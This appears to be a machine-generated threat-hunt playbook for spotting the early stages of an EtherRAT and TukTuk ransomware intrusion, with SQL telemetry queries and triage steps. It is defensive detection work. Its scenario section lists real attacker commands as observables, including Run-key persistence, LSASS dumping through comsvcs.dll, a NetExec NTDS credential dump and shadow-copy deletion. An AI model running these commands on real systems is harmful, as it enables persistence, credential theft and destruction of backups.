---
analysis: A single detection rule would only catch a specific indicator like the AppResolver
  registry key. This hunt correlates MSI execution with rare module loads and automated
  discovery scripts across multiple surfaces, providing the context required to confirm
  a sophisticated intrusion.
blind_spots:
- id: module-load-visibility
  question: whether the sideloaded DLL is present on hosts without endpoint agent
    coverage
  requires: hb_module_activity coverage on all hosts
  risk: A host without an agent contributes no module load telemetry, allowing sideloading
    to go unobserved.
  stage: secondary-payload-sideloading
- id: script-block-fragmentation
  question: whether discovery commands were split across multiple blocks
  requires: hb_script_activity with block reassembly
  risk: Adversaries may split strings across script blocks, preventing simple keyword
    matches in a single script row.
  stage: internal-reconnaissance-and-discovery
coverage:
- stage: initial-access-trojanized-msi
  status: covered
  steps:
  - scoping-msi-execution
- stage: etherrat-execution-node-js
  status: covered
  steps:
  - node-runtime-drops
- stage: persistence-registry-run-key
  status: covered
  steps:
  - registry-persistence-rare
- stage: internal-reconnaissance-and-discovery
  status: covered
  steps:
  - discovery-activity
- stage: secondary-payload-sideloading
  status: covered
  steps:
  - sideload-detection
- reason: 'Belongs to another part of the ''Flash Alert: EtherRat and TukTuk C2 End
    in The Gentleman Ransomware'' series.'
  stage: blockchain-and-saas-c2
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: EtherRat and TukTuk C2 End
    in The Gentleman Ransomware'' series.'
  stage: credential-access-lsass-dumping
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: EtherRat and TukTuk C2 End
    in The Gentleman Ransomware'' series.'
  stage: lateral-movement-rmm-and-netexec
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: EtherRat and TukTuk C2 End
    in The Gentleman Ransomware'' series.'
  stage: data-exfiltration-rclone
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: EtherRat and TukTuk C2 End
    in The Gentleman Ransomware'' series.'
  stage: impact-gpo-ransomware
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: This hunt identifies the early infection chain of a ransomware actor.
    By stopping EtherRAT and TukTuk before they escalate to credential theft and lateral
    movement, the business avoids the high cost of a domain-wide ransomware event.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An intruder has gained initial access via a trojanized MSI installer,
  established persistence using a Node.js-based EtherRAT, and is currently performing
  system discovery or sideloading TukTuk payloads.
labels:
- hunt
- attack.t1204.002
- attack.t1059.003
- attack.t1105
- attack.t1547.001
- attack.t1082
- attack.t1574.002
name: EtherRAT and TukTuk Initial Infection and Discovery
parameters:
  discovery_scripts:
    default:
    - discovery.ps1
    - recon.ps1
    description: Names of scripts used for automated reconnaissance.
    from:
      kind: article
      observed: '2026-05-11'
      ref: dfir-report-etherrat
    type: list[path]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    type: number
  msi_scripts:
    default:
    - mvnvmuyj.cmd
    description: Script filenames spawned from msiexec observed in the campaign.
    from:
      kind: article
      observed: '2026-05-11'
      ref: dfir-report-etherrat
    type: list[path]
  node_binaries:
    default:
    - node.exe
    - node-v18.20.5-win-x64.zip
    description: Filenames associated with the malicious Node.js runtime deployment.
    from:
      kind: article
      observed: '2026-05-11'
      ref: dfir-report-etherrat
    type: list[path]
  node_configs:
    default:
    - a7pnj975bl.cfg
    description: Configuration filenames for the EtherRAT payload.
    from:
      kind: article
      observed: '2026-05-11'
      ref: dfir-report-etherrat
    type: list[path]
  scope_hosts:
    default: []
    description: Optional list of hosts to narrow the hunt, typically populated from
      the results of the initial scoping step.
    type: list[host]
  sideload_binaries:
    default:
    - greenshot.exe
    - synctrayzor.exe
    - docfx.exe
    - cake.exe
    description: Legitimate binaries commonly abused for DLL sideloading in this campaign.
    from:
      kind: article
      observed: '2026-05-11'
      ref: dfir-report-etherrat
    type: list[path]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus on endpoints where MSI installers are common, such as administrator
  workstations or servers where RAMMap is legitimately used. If Node.js is discovered
  in a user profile on any host, widen the search to the entire fleet by clearing
  the scope_hosts parameter.
references:
- name: "The DFIR Report \u2014 Flash Alert: EtherRat and TukTuk C2 End in The Gentleman\
    \ Ransomware"
  url: https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/
related:
- hunt: blockchain-and-saas-c2
  reason: This hunt identifies local execution; follow-on C2 traffic via Ethereum
    and SaaS platforms is handled in a subsequent hunt.
  relation: follows
scenario:
  stages:
  - name: Trojanized MSI installer
    observables:
    - msiexec.exe /V
    - MVnVmUYj.cmd
    - RAMMap utility masquerade
    slug: initial-access-trojanized-msi
    tactic: initial-access
    techniques:
    - T1204.002
  - name: EtherRAT execution via Node.js
    observables:
    - curl -sLo "C:\Users\REDACTED\AppData\Local\Temp\9gY0LJMyXW.zip" "https://nodejs.org/dist/v18.20.5/node-v18.20.5-win-x64.zip"
    - node-v18.20.5-win-x64.zip
    - node.exe
    - A7Pnj975bl.cfg
    slug: etherrat-execution-node-js
    tactic: execution
    techniques:
    - T1059.003
    - T1105
  - name: Persistence via Registry Run key
    observables:
    - reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AppResolver /d
      "conhost --headless "C:\Users\REDACTED\AppData\Local\P2RsupmqXnmx\gksVMg\node.exe"
      "C:\Users\REDACTED\AppData\Local\P2RsupmqXnmx\A7Pnj975bl.cfg"" /f
    - AppResolver
    slug: persistence-registry-run-key
    tactic: persistence
    techniques:
    - T1547.001
  - name: Internal reconnaissance and discovery
    observables:
    - powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "[System.Globalization.CultureInfo]::InstalledUICulture.Name"
    - powershell -Command "try { (Get-CimInstance -Namespace root/SecurityCenter2
      -ClassName AntivirusProduct -EA Stop).displayName -join ', ' } catch { 'none'
      }"
    - net group "Domain Admins" /domain
    - nltest /domain_trusts /all_trusts
    - netscan.exe
    slug: internal-reconnaissance-and-discovery
    tactic: discovery
    techniques:
    - T1082
    - T1518.001
    - T1087.002
    - T1018
  - name: TukTuk deployment via DLL sideloading
    observables:
    - Greenshot.exe
    - SyncTrayzor.exe
    - docfx.exe
    - Cake.exe
    slug: secondary-payload-sideloading
    tactic: defense-evasion
    techniques:
    - T1574.002
  - name: Blockchain and SaaS C2
    observables:
    - 1rpc.io
    - goldsky.arweave.net
    - trycloudflare.com
    - supabase.co
    - 1rpc.io
    - goldsky.arweave.net
    slug: blockchain-and-saas-c2
    tactic: command-and-control
    techniques:
    - T1102.001
    - T1572
  - name: Credential Access via LSASS dumping
    observables:
    - 'rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24'
    - Kerberoasting
    - NTDS dumping
    slug: credential-access-lsass-dumping
    tactic: credential-access
    techniques:
    - T1003.001
    - T1558.003
  - name: Lateral movement via RMM and NetExec
    observables:
    - GoToResolveProcessChecker.exe
    - nxc smb REDACTED_IP -u REDACTED_USER -p REDACTED_PASSWORD --ntds
    - nxc
    - winrm
    slug: lateral-movement-rmm-and-netexec
    tactic: lateral-movement
    techniques:
    - T1219
    - T1021.001
    - T1021.002
  - name: Data exfiltration via Rclone
    observables:
    - rclone
    - Wasabi cloud storage
    slug: data-exfiltration-rclone
    tactic: exfiltration
    techniques:
    - T1567.002
  - name: Ransomware deployment via GPO
    observables:
    - The Gentlemen ransomware
    - Microsoft Defender disabled
    - GPO execution via SYSVOL/NETLOGON
    - vssadmin.exe delete shadows
    slug: impact-gpo-ransomware
    tactic: impact
    techniques:
    - T1486
    - T1489
    - T1053.005
    - T1484.001
  summary: A threat actor used a trojanized MSI installer to deploy EtherRAT, leveraging
    Ethereum blockchain and TryCloudflare for resilient C2 before deploying the TukTuk
    framework via DLL sideloading. The intrusion progressed through extensive AD discovery
    and lateral movement using NetExec and GoTo Resolve, concluding with data exfiltration
    via Rclone and domain-wide deployment of The Gentleman ransomware via GPO and
    scheduled tasks.
series:
  index: 1
  slug: flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware
  title: 'Flash Alert: EtherRat and TukTuk C2 End in The Gentleman Ransomware'
  total: 3
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
tlp: clear
type: investigation
---


# EtherRAT and TukTuk Initial Infection and Discovery

This hunt identifies the earliest stages of an EtherRAT intrusion, starting from the execution of a malicious MSI masquerading as RAMMap. It follows the chain from the deployment of a portable Node.js runtime and registry-based persistence to follow-on reconnaissance using PowerShell and DLL sideloading in legitimate binaries like Greenshot. By correlating these distinct behavioral markers across process, file, registry, and module surfaces, the hunt identifies the breach before the actor moves to credential theft or domain-wide encryption.

## scoping-msi-execution
<!-- MSI execution spawning shell scripts -->
Identify potential initial access by finding msiexec.exe spawning cmd.exe or specific malicious script files named in the report.

```sqlite target=endpoint role=scoping params=(lookback_days=lookback_days, msi_scripts=msi_scripts)
~~~yaml
expected: A hit shows msiexec launching a shell script from a temporary directory;
  silence suggests the specific MSI delivery vector was not used.
reads:
- device_hostname
- process_name
- process_cmd_line
- parent_process_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-24'
~~~
SELECT device_hostname, process_name, process_cmd_line, parent_process_name, time FROM hb_process_activity WHERE LOWER(parent_process_name) LIKE '%msiexec.exe' AND (instr(',' || '{{msi_scripts}}' || ',', ',' || LOWER(process_name) || ',') > 0 OR instr(LOWER(process_cmd_line), 'mvnvmuyj') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## early-stage-parallel
<!-- Examine infection markers -->
parallel:
- → node-runtime-drops
- → registry-persistence-rare
join: → agent-early-triage

## node-runtime-drops
<!-- Node.js runtime file creation -->
Detect the creation of the portable Node.js runtime and associated configuration files, pivoting on hosts from the initial MSI execution.

```sqlite target=endpoint role=enrichment params=(lookback_days=lookback_days, scope_hosts=scope_hosts, node_binaries=node_binaries, node_configs=node_configs)
~~~yaml
expected: Creation of node.exe or .cfg files in user profiles. These files often appear
  in AppData subfolders with randomized names.
reads:
- device_hostname
- file_path
- file_name
- time
silence: not_evidence_of_absence
source: hb_file_activity
verified: dry-run
verified_at: '2026-09-24'
~~~
SELECT device_hostname, file_path, file_name, time FROM hb_file_activity WHERE ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND (instr(',' || '{{node_binaries}}' || ',', ',' || LOWER(file_name) || ',') > 0 OR instr(',' || '{{node_configs}}' || ',', ',' || LOWER(file_name) || ',') > 0) AND (LOWER(file_path) LIKE '%\appdata\%' OR LOWER(file_path) LIKE '%\temp\%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## registry-persistence-rare
<!-- Rare Node.js Run-key persistence -->
Identify the EtherRAT persistence mechanism which points a Run key at a profile-path Node.js binary, using prevalence to filter out normal fleet activity.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: A rare Run key executing node.exe from an AppData path, seen on very few
  hosts across the estate.
prevalence:
  by: device_hostname
  key:
  - reg_value_data
  rare_below: 5
reads:
- device_hostname
- reg_target
- reg_value_data
- time
silence: not_evidence_of_absence
source: hb_registry_activity
verified: dry-run
verified_at: '2026-09-24'
~~~
SELECT reg_value_data, COUNT(DISTINCT device_hostname) AS hosts, MIN(time) AS first_seen FROM hb_registry_activity WHERE ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND LOWER(reg_target) LIKE '%\currentversion\run%' AND instr(LOWER(reg_value_data), 'node.exe') > 0 AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY reg_value_data HAVING hosts <= 5 ORDER BY hosts ASC
```

## agent-early-triage
<!-- Weigh early infection evidence -->
```agent target=hunter
cite: required
context:
- scoping-msi-execution
- node-runtime-drops
- registry-persistence-rare
max_iterations: 3
objective: Determine if the host shows a complete chain of MSI execution, Node.js
  deployment, and registry persistence.
success_criteria: A verdict of malicious | suspicious | benign citing specific process
  paths and registry data.
tools:
- endpoint
```

## follow-on-parallel
<!-- Examine post-infection behavior -->
parallel:
- → discovery-activity
- → sideload-detection
join: → agent-intrusion-analysis

## discovery-activity
<!-- Automated discovery and script execution -->
Identify PowerShell-based discovery of AV products, domain membership, and system settings using both named scripts and behavioral keywords.

```sqlite target=endpoint role=triage params=(lookback_days=lookback_days, scope_hosts=scope_hosts, discovery_scripts=discovery_scripts)
~~~yaml
expected: Script blocks performing enumeration of security products or AD domain configuration,
  often running shortly after persistence is established.
reads:
- device_hostname
- script_name
- script_content
- time
silence: not_evidence_of_absence
source: hb_script_activity
verified: dry-run
verified_at: '2026-09-24'
~~~
SELECT device_hostname, script_name, script_content, time FROM hb_script_activity WHERE ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND (instr(',' || '{{discovery_scripts}}' || ',', ',' || LOWER(script_name) || ',') > 0 OR instr(LOWER(script_content), 'antivirusproduct') > 0 OR instr(LOWER(script_content), 'installeduiculture') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## sideload-detection
<!-- Legitimate binaries loading rare modules -->
Detect potential DLL sideloading for TukTuk deployment by identifying legitimate binaries loading modules from user-writable paths.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days, scope_hosts=scope_hosts, sideload_binaries=sideload_binaries)
~~~yaml
expected: A legitimate process like Greenshot.exe loading a DLL from a user path that
  is unique across the fleet.
reads:
- device_hostname
- process_name
- module_name
- module_path
- time
silence: not_evidence_of_absence
source: hb_module_activity
verified: dry-run
verified_at: '2026-09-24'
~~~
SELECT device_hostname, process_name, module_name, module_path, time FROM hb_module_activity WHERE ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND instr(',' || '{{sideload_binaries}}' || ',', ',' || LOWER(process_name) || ',') > 0 AND (LOWER(module_path) LIKE '%\appdata\%' OR LOWER(module_path) LIKE '%\temp\%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## agent-intrusion-analysis
<!-- Complete intrusion chain analysis -->
```agent target=hunter
cite: required
context:
- agent-early-triage
- discovery-activity
- sideload-detection
max_iterations: 5
objective: Determine if the host is compromised based on the full chain of observed
  EtherRAT and TukTuk indicators, including persistence and discovery behavior.
success_criteria: A final verdict citing the transition from persistence to reconnaissance
  or sideloading per host.
tools:
- endpoint
```

## decision-route
<!-- Route based on intrusion verdict -->
if~: "the intrusion analysis verdict is malicious for at least one host" (confidence: high, judge=hunter)
then: → containment-action
indeterminate: → analyst-remediation
unavailable: → analyst-remediation (blind_spot: module-load-visibility)
else: → close-out-task

## containment-action
<!-- Isolate compromised host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host from the network and collect memory for TukTuk and EtherRAT forensics.
```
→ analyst-remediation

## analyst-remediation
<!-- Analyst remediation and collection -->
```manual target=analyst
Review the binaries identified in the sideloading step. Search for the portable Node.js runtime and its configuration blobs in AppData subdirectories. Confirm if any GPO-based ransomware deployment was initiated.
```
→ close-out-task

## close-out-task
<!-- Hunt close-out -->
```manual target=analyst
Document findings, update indicators for rotated filenames, and promote the registry Run key query to a standing detection rule.
```
→ end
